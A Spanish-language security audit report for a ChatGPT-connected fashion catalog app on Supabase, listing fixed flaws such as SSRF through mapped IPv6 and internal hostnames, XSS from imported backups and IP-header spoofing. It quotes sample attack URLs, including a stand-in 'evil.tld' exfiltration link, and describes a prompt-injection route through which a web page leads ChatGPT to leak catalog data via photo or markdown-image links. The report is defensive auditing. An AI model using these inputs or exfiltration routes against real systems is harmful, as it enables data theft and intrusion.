# Informe de seguridad — Mi Catálogo de Moda

> Actualización de preparación Windows (29/10/2026): los resultados históricos de este documento no sustituyen la verificación del entorno real. Ver `reports/INFORME.md` para la nueva ejecución: 15 utilidades, 27 flujos y 154 ataques de handler con dobles; 137 ataques en PostgreSQL 16.15 real con esquemas Auth/Storage de prueba; XSS Chromium sin ejecuciones. Compilación iOS, stack Supabase completo, Appetize y producción siguen pendientes. No se desplegó ningún servicio remoto.

Primera auditoría: 28 de octubre de 2026. Segunda auditoría (por cobertura e independiente): 29 de octubre de 2026.

Alcance: la API para ChatGPT, la base de datos con Row Level Security (RLS) y almacenamiento, la vista previa web y el código de la app iOS.

Método: ataques reales ejecutados en un entorno aislado:
- La API se probó con su código de verdad contra una base de datos en memoria.
- Las migraciones se probaron en un Postgres 16 real.
- La vista previa se atacó en Chromium con datos envenenados y navegación aleatoria.
- El código Swift se revisó a mano, porque aquí no hay Xcode.
- En la segunda ronda, un auditor independiente revisó el código **sin ver** este informe ni las pruebas de ataque. Después se le pidió que intentara saltarse cada corrección.

Nada de esto se ha probado aún en el Supabase real; ver "Pendiente de verificar en producción".

## Resultado

| Parte | Pruebas | Resultado |
|---|---|---|
| Base de datos (RLS, funciones, storage, registro, inventario tipo Security Advisor) | 137 ataques + carrera de 60 conexiones | 137/137 bloqueados; el límite aceptó exactamente 20 de 60 |
| API (autenticación, permisos, inyección, SSRF, abuso, IDOR, presupuesto, secretos) | 154 ataques (`tests/e2e/attack.mjs`) | 154/154 resistidos |
| API (flujo normal y lógica) | 27 pruebas (`run.mjs`) + 15 (`shared.test.ts`) + actualización desde la versión anterior | todas pasan |
| Vista previa web (XSS y fuga de datos) | 4 recorridos con datos maliciosos + copia importada maliciosa + CSP | antes: XSS ejecutado; ahora: 0, y la CSP bloquea cualquier envío de datos a otro sitio |
| App iOS | revisión de enlaces, descargas, DNS, importación + pruebas XCTest listas para Xcode | corregido; falta compilar (lo hace Codex) |

## Vulnerabilidades encontradas y corregidas

### Graves

1. **SSRF con IPv6 mapeada.** `http://[::ffff:169.254.169.254]/` (el servicio de metadatos del servidor) y `http://[::ffff:127.0.0.1]/` pasaban el filtro. La URL se normaliza a `[::ffff:a9fe:a9fe]` y la comprobación solo reconocía el formato con puntos.
   - Corregido: ahora se analiza cualquier IPv6 a sus 16 bytes y solo se admite unicast global.
   - Las direcciones que llevan una IPv4 dentro (mapeada, NAT64, 6to4) se juzgan por esa IPv4.
2. **SSRF por nombres internos.** `http://db/`, `http://kong:8000/`, `localhost.` (con punto final) y `*.svc` pasaban.
   - Corregido: se bloquean los nombres sin dominio, el punto final, los sufijos internos y los puertos distintos de 80 y 443.
3. **DNS que fallaba abierto.** Si `Deno.resolveDns` no existía o daba error, se descargaba sin comprobar a qué IP apuntaba el dominio. Por ejemplo, un dominio que apunta a `127.0.0.1` pasaba.
   - Corregido: si no se puede verificar, no se descarga.
4. **XSS en la vista previa web.** Una copia de seguridad `.json` manipulada (por ejemplo, una que alguien te envía) ejecutaba código al importarla. Los ids, las rutas de foto y los logos se insertaban en el HTML sin escapar.
   - Corregido: todo lo que se carga o importa se valida campo a campo (`sanitizeDB`).
   - Los atributos se escapan.
   - Las imágenes solo pueden ser `data:image/...` en base64.
   - Los enlaces solo pueden ser http(s).

### Medias

5. **Bloqueo anti fuerza bruta esquivable.** La IP se tomaba de la primera entrada de `x-forwarded-for`, que la escribe el atacante. Rotándola, se saltaba el bloqueo y también la lista `ALLOWED_IP_CIDRS`.
   - Corregido: se usa la última entrada (la que añade el proxy) o una cabecera fiable (`CLIENT_IP_HEADER`).
   - Además hay un freno global de 300 fallos cada 30 minutos para quien rote IPs reales.
   - Tu clave válida nunca se bloquea.
6. **Registro abierto.** Si el registro público de Supabase quedaba activo, cualquiera podía crearse una cuenta. No veía tus datos, pero usaba tu cuota de base de datos y storage.
   - Corregido en la base de datos: solo se admite 1 usuario (`private.app_config.max_users`).
7. **Claves revocadas reactivables.** Desde la app se podía poner `revoked_at = null`.
   - Corregido: la revocación es definitiva e inmediata (disparador `api_keys_guard`).
8. **Cuerpo sin límite real.** Se leía el cuerpo entero antes de comprobar su tamaño.
   - Corregido: lectura por trozos, corte a 100 KB y rechazo del UTF-8 inválido.
9. **Descarga lenta sin fin.** El plazo de 15 s solo cubría las cabeceras, no el cuerpo, así que un servidor podía mantener la función ocupada.
   - Corregido: un único plazo cubre las redirecciones y la descarga.
10. **Filtros que daban error interno.** `?status=admin` daba error 500 (era un enum de Postgres), y el comodín `*` en la marca se convertía en "todo".
    - Corregido: el estado se valida y los comodines se quitan.
11. **App iOS:**
    - Comprobaba los enlaces con `hasPrefix("http")`, que acepta esquemas como `httpfalso://`.
    - Las fotos y páginas se descargaban enteras en memoria sin límite.
    - Las redirecciones podían ir a la red local.
    - Una copia importada podía colar enlaces con cualquier esquema.
    - Corregido con `Services/NetworkSafety.swift` (enlaces solo http(s), sin red local, sin usuario@host, descarga con tope de tamaño y redirecciones vigiladas), usado en todas las vistas y servicios, y con validación en `BackupService.restore`.

### Menores / defensa en profundidad

12. **Caracteres invisibles y de dirección** (U+202E, de ancho cero) y sustitutos sueltos. Servían para disfrazar nombres o rompían Postgres. Ahora se eliminan.
13. **Enlaces tipo `https://taobao.com@web-falsa.com`.** Ahora se rechazan.
14. **Mensajes de error.** Los de fotos ya no muestran detalles de la base de datos, del storage ni de códigos internos.
15. **Permisos del rol anónimo.** No tiene ninguno sobre ninguna tabla ni función del esquema público. Las tablas que solo escribe el servidor (`api_audit_log`, `product_versions`, contadores) no aceptan escrituras desde la app, así que nadie puede borrar el historial para ocultar lo que hizo.
16. **Logos SVG** (que pueden llevar scripts). Ya no se admiten en el bucket `brand-logos`.
17. **Sal de las IPs.** Si falta `API_IP_SALT`, se deriva de la clave de servicio en vez de usar un texto fijo conocido.
18. **Historial de la API.** Se borra automáticamente al año (`api_cleanup`).

## Segunda auditoría (29 de octubre)

### A. Revisión por cobertura (cada endpoint, función y permiso con su prueba)

19. **Mínimo privilegio.** Antes, cualquier clave con `write` podía modificar todo lo existente.
    - Nuevo permiso `create`: solo guardar productos nuevos, sin leer ni tocar lo que ya tienes. `write` incluye `create`.
    - La configuración recomendada son dos GPTs: uno `{create}` y otro `{read}` (ver C).
    - Cada ruta declara su permiso (`requiredScope`); una ruta que no esté en la lista no existe.
20. **Fugas por la respuesta.** Una clave sin `read` podía saber qué productos tenías mirando los 409 o `check-duplicate`, que devolvían nombre e id, y lo que devolvía un PATCH.
    - Ahora, sin `read`, la respuesta es siempre la misma, `Recibido`, y no se pueden consultar colecciones ni duplicados.
21. **Coste y almacenamiento.** El límite era de 400 fotos al día de hasta 12 MB, unos 4,8 GB diarios.
    - Ahora hay un tope de MB al día (300 por defecto) y un espacio total máximo (2 GB por defecto).
    - El espacio se mide en el storage real, incluidos los archivos huérfanos.
    - Los dos se ajustan desde la app.
22. **Carrera de duplicados.** 6 peticiones simultáneas con el mismo enlace creaban 6 productos.
    - Ahora queda 1, y las otras 5 reciben 409.
23. **Inventario de la base de datos**, al estilo del Security Advisor. Todo se comprueba automáticamente en `attack.sql`:
    - No hay vistas.
    - No hay extensiones en `public`.
    - La app solo puede llamar a 2 funciones.
    - Las funciones del servidor solo las ejecuta `service_role`.
    - Todos los buckets son privados.
    - Todas las políticas son solo para usuarios con sesión.
    - La app solo escribe en sus propias tablas.
    - Cada tabla tiene RLS.
24. **Dependencia fijada.** `supabase-js` estaba como `@2` (cualquier versión 2.x). Ahora está fijada a `2.103.2`; se actualiza a propósito, no por accidente.
25. **Vista previa web: CSP.** Aunque apareciera un XSS nuevo, el navegador ya no deja enviar datos a otro sitio (`connect-src` e `img-src` cerrados). Comprobado en Chromium.

### B. Hallazgos del auditor independiente

| # | Severidad | Hallazgo | Corrección |
|---|---|---|---|
| 26 | Alta | Una página que manipule a ChatGPT podía hacer que leyera tu catálogo y lo enviara escondido en el enlace de una "foto" (`https://evil.tld/a.jpg?d=<tus datos>`), y el servidor lo entregaba | 1) Consultar el catálogo y modificar productos **siempre pide tu confirmación** en ChatGPT (`x-openai-isConsequential`). 2) Con una clave sin `read`, no hay nada que robar. 3) Enlaces de foto de 600 caracteres como máximo. 4) Modo máximo opcional `IMAGE_HOST_ALLOWLIST`: solo se descargan fotos de los sitios que elijas |
| 27 | Media | DNS rebinding: se comprueba el dominio y luego `fetch` lo vuelve a resolver. Los distintos mensajes de error servían para "escanear" la red interna | Tras conectar, todos los fallos dan **el mismo mensaje**, también en las redirecciones. Plazo de 10 s por foto y 45 s por petición. Con `IMAGE_HOST_ALLOWLIST`, el rebinding exige controlar uno de esos dominios. Lo que queda está en "Riesgos que quedan" |
| 28 | Media | 31 cambios desde la API borraban para siempre el estado original de un producto (solo se guardaban las 30 últimas versiones) | Se guarda todo lo de los últimos 30 días y, siempre, tu último cambio a mano y el estado que dejaste. Máximo 20 cambios por producto y día desde la API. Probado con 40 cambios seguidos |
| 29 | Baja-media | Abuso de almacenamiento, y la limpieza de contadores no estaba programada | Presupuesto de MB (n.º 21), plazos más cortos y limpieza diaria con pg_cron desde la migración |
| 30 | Baja | Si fallaban las fotos, el producto se creaba sin registrarse en el historial | El historial se escribe nada más crear el producto |
| 31 | Baja | `ALLOWED_IP_CIDRS` con un error de escritura (`1.2.3.4/`) abría la API a todo el mundo | La máscara se valida estrictamente y una configuración inválida **bloquea todo** |
| 32 | Baja | Se aceptaba cualquier MP4 o MOV como foto HEIC | Se comprueba la marca HEIF |
| 33 | Baja | Se podían crear claves sin caducidad | Caducidad obligatoria (1 a 730 días), en la función y como regla de la tabla |
| 34 | Baja | iOS solo comprobaba el nombre del host: `192-168-1-1.nip.io` llegaba a tu red de casa | Antes de conectar, y en cada redirección, se resuelve el DNS y se exige que todas las IPs sean públicas. Sigue funcionando en redes móviles solo IPv6 (NAT64) |
| 35 | Baja | La importación de copias en iOS cortaba pocos textos, admitía portadas sin límite e ids repetidos | Todo se recorta, con límites de cantidad y tamaño, ids únicos y `rollback` si falla |
| — | (verificar) | Qué IP real llega detrás del proxy de Supabase | Paso 7 de la fase 1 de `AGENTS.md` |

El auditor no encontró ningún fallo de autorización, RLS, permisos, filtros, XSS ni contaminación de prototipos.

### C. Re-verificación del auditor (intentó saltarse cada corrección)

Resultado de la re-verificación (rondas 3 y 4): 7 correcciones aguantaron (#28 a #33 y #35) y 3 solo en parte (#26, #27 y #34). Además, los cambios introdujeron 3 problemas nuevos (A, B y C). Todo se corrigió:

| Hallazgo | Qué faltaba | Corrección final |
|---|---|---|
| #26 Sacar datos por enlaces de foto | Con una clave que lee y guarda, los datos ya leídos podían salir más tarde por una "foto". Además, la clave "solo guardar" aún podía ver los nombres de las colecciones y saber si un enlace estaba guardado | **Diseño de dos GPTs.** "Guardar" (`{create}`) busca en internet pero no puede leer nada: no ve colecciones, no consulta duplicados y su respuesta es idéntica exista o no el producto. "Consultar" (`{read}`) lee, pero no tiene internet ni puede hacer que el servidor descargue nada. Si alguien prefiere un GPT único, las fotos se limitan **por defecto** a sitios de fotos conocidos |
| #27 DNS rebinding | Seguía abierto sin lista de sitios, y los mensajes antes de conectar distinguían "no existe" de "es interno" | Con lectura, la lista de sitios va activada por defecto. Los mensajes de DNS son idénticos. Lo que queda está en "Riesgos que quedan" |
| #7 IP detrás del proxy | Depende del despliegue | `ALLOWED_IP_CIDRS` ahora **exige** `CLIENT_IP_HEADER`; si no, la función se niega a arrancar. Así no hay falsa seguridad |
| C (nuevo) | La regla de caducidad obligatoria rompía la actualización si ya existía una clave sin caducidad | La migración acorta primero esas claves. Probado instalando la versión anterior, creando una clave eterna y actualizando |
| A y B (nuevos) | La clave "solo guardar" podía filtrar algo de información, y guardar ya no pedía confirmación | Resueltos con el diseño de dos GPTs (arriba) |
| Ronda 4: oráculo de fotos | Con "solo guardar", un duplicado no descargaba fotos y uno nuevo sí. El servidor del atacante notaba la diferencia | Si es un duplicado, también se descargan, y luego se descartan, con el mismo cupo y las mismas reglas. Probado: el servidor del atacante recibe exactamente lo mismo |
| Ronda 4: nombres de colecciones | `POST /collections` devolvía el nombre exacto de una colección existente | Sin lectura responde siempre "Recibido" |
| Ronda 4: lista de sitios mal escrita | `IMAGE_HOST_ALLOWLIST=alicdn` (sin .com) desactivaba la protección | Una lista sin dominios válidos bloquea todas las fotos; solo `*` la desactiva |
| Ronda 4: sitios demasiado amplios | La lista por defecto incluía dominios enteros (agentes, `shopify.com`, tiendas) con proxies, redirecciones o subdominios que se pueden secuestrar | Solo quedan los CDNs de imágenes: `alicdn.com`, `geilicdn.com`, `photo.yupoo.com`, `cdn.shopify.com`, `static.nike.com`, etc. |
| Ronda 4: cabecera de IP ausente | Con `CLIENT_IP_HEADER` configurado, si no llegaba se usaba otra IP | Sin la cabecera no se adivina: IP vacía, y con lista de IPs, rechazo |
| Ronda 4: GPT Consultar | Un texto guardado con trampa podía hacer que mostrara una imagen markdown hacia otra web | Sus instrucciones prohíben mostrar imágenes o enlaces construidos con textos del catálogo. Además no tiene herramientas |
| #34 iOS NAT64 | En redes con un prefijo NAT64 propio, una IP privada se ve como pública | Riesgo bajo; lo cubre el aviso "Red local" de iOS |

## Lo que se intentó y ya resistía

**Autenticación:**
- Claves inventadas, recortadas, en mayúsculas o con inyección SQL.
- Claves revocadas o caducadas.
- La clave en la URL.
- Un JWT falsificado de `service_role`.
- Cookies.

**Datos de otros usuarios (IDOR):**
- Ver, editar, marcar como favorito, añadir fotos o mover entre colecciones productos ajenos.
- Usar el id de una colección ajena.
- Averiguar qué enlaces tiene guardados otro usuario.

**Base de datos:**
- Cambiar el dueño de una fila.
- Colgar fotos en un producto ajeno.
- Fabricar versiones.
- Restaurar versiones ajenas.
- Llamar a las funciones internas.
- Subir archivos a la carpeta de otro o salir con `../`.

**Cuerpos JSON maliciosos:**
- `__proto__` y `constructor` (sin contaminación de prototipos).
- JSON anidado 30.000 niveles.
- Listas enormes.
- Objetos donde se espera texto (estilo NoSQL).
- `javascript:`, `data:` y `file:` como enlaces.
- Fijar `id`, dueño, origen o fechas.

**Navegador:**
- CORS: no hay, así que ninguna web puede leer la API desde un navegador.
- Formularios web: se responde 415.

**Concurrencia:** 60 peticiones simultáneas contra un límite de 20 aceptaron exactamente 20.

## Matriz de cobertura

**Endpoints de la API** (`attack.mjs`, por sección):

| Operación | Permiso | Ataques que la cubren |
|---|---|---|
| `GET /health` | ninguno | 1 |
| `GET /categories` | cualquiera | 1, 2, 11, 12 |
| `GET /collections` | read | 7, 11 |
| `POST /collections` | create | 7, 11 |
| `GET /products` (búsqueda) | read | 6, 7, 11 |
| `POST /products` | create | 4, 5, 7, 9, 10, 11, 11b, 13 |
| `POST /products/check-duplicate` | read | 7, 11 |
| `GET /products/{id}` | read | 3, 7, 11, 14 |
| `PATCH /products/{id}` | write | 5, 7, 8, 10, 11, 11b |
| `POST /products/{id}/images` | write | 9, 11, 11b, 13 |
| `PUT /products/{id}/favorite` | write | 7, 11 |
| `POST /products/{id}/collections` | write | 7, 11 |
| Cualquier otra ruta o método | — | 3, 11 (404 o 405) |

**Funciones de la base de datos** (`attack.sql`):

| Función | Quién puede ejecutarla | Cobertura |
|---|---|---|
| `create_api_key` | la app (solo para ti) | anon y otro usuario lo intentan; permisos inventados; sin caducidad; máximo 5 |
| `restore_product_version` | la app (con RLS) | versión ajena; anon |
| `api_authenticate`, `api_consume`, `api_note_auth_failure`, `api_auth_failures_recent`, `api_cleanup`, `api_storage_used` | solo el servidor | anon y app lo intentan; carrera de concurrencia; espacio por cuenta |
| `seed_user` | solo el servidor | anon y app lo intentan |
| Disparadores (`keep_product_version`, `check_*_owner`, `api_keys_guard`, `limit_signups`, `seed_*`, `set_updated_at`) | nadie directamente | llamada directa; historial bajo ataque; reactivación de claves; registro cerrado |

**Tablas y storage:** las 13 tablas y los 2 buckets se prueban con anon, con otro usuario (leer, cambiar, borrar y crear a tu nombre) y con tu propia cuenta (que funcione lo legítimo).

**Datos no confiables y dónde se validan:**

| Dato | Validación |
|---|---|
| Cuerpo JSON de la API | `parseProductFields`, `parseImages` y `parseNameList`, más los límites de tamaño |
| Fotos descargadas | `assertPublicHost`, plazo, tope de tamaño, bytes reales y presupuesto |
| Copia importada en la web | `sanitizeDB` |
| Copia importada en iOS | `BackupService.restore` |
| Datos de la nube en iOS (futura sincronización) | `AGENTS.md` fase 3.4 exige la misma validación |
| Páginas web en iOS | `NetworkSafety.data`, que limita el análisis a 1,5 MB |

## Riesgos que quedan (y por qué son aceptables)

- **DNS rebinding en el servidor, solo con claves "solo guardar".** El runtime de Supabase no permite conectarse a la IP que ya se comprobó.
  - Con lectura, la lista de sitios lo cierra.
  - Sin lectura, lo peor que puede pasar es una petición a ciegas: no hay datos tuyos que sacar, el error es idéntico y solo se guardan bytes que de verdad son una imagen.
  - Queda una pista de tiempo (cuánto tarda una foto). No permite leer nada.
- **Manipulación de ChatGPT por páginas web (prompt injection).** Ningún sistema puede impedir que un modelo lea una página maliciosa. Con los dos GPTs no hay ningún camino para robar datos:
  - El que lee no tiene internet.
  - El que tiene internet no puede leer.
  - En el peor caso, una página trampa haría que "Guardar" añada productos basura. Eso está limitado por día y por MB, queda en el historial y se borra desde la app.
  - No puede borrar ni modificar nada tuyo.
- **iOS:** queda un margen teórico entre la comprobación del DNS y la conexión, y la variante NAT64 de arriba. Los cubre el aviso "Red local" de iOS.
- **iOS, copia de seguridad gigante:** una copia de 300 MB hecha a propósito puede cerrar la app al importarla. No toca datos ni permisos, y solo ocurre si tú importas ese archivo.
- **Espacio máximo:** dos peticiones a la vez pueden pasarse un poco del tope. El exceso está limitado por el máximo de MB diarios.
- **El coste de invocaciones.** Alguien con muchas IPs puede llamar a la API con claves falsas. Cada intento se rechaza con freno global, pero cuenta como invocación de Supabase. El plan gratuito incluye 500.000 al mes; vigílalo en el panel.
- **Tu cuenta de Supabase y tu Apple ID** son la llave maestra. Activa la verificación en dos pasos en ambos.

## Pendiente de verificar en producción (lo hace el agente, `AGENTS.md`)

1. Qué cabeceras de IP llegan realmente a la función (configurar `CLIENT_IP_HEADER` si hay una fiable). Hasta entonces, no uses `ALLOWED_IP_CIDRS`.
2. Que `Deno.resolveDns` funciona (paso 10 de `scripts/test-api.sh`).
3. Que el Security Advisor del panel de Supabase sale sin avisos.
4. Que la app compila en Xcode y pasan las pruebas de `ios/FashionCatalogTests` (lista de comprobación MASVS en `AGENTS.md`).
5. Que ChatGPT pide confirmación antes de consultar o modificar, y la prueba de manipulación no destructiva de la fase 4.
6. Que pg_cron quedó programado (`select * from cron.job`).

## Cómo repetir las pruebas

```bash
cd backend/supabase/functions && node --experimental-strip-types tests/shared.test.ts
cd tests/e2e && node --experimental-strip-types --import ./register.mjs run.mjs
node --experimental-strip-types --import ./register.mjs attack.mjs
PGHOST=<socket> PGUSER=postgres ../../../../scripts/run-db-tests.sh     # Postgres local
API_URL=... API_KEY=... backend/scripts/test-api.sh                      # contra la API desplegada
```
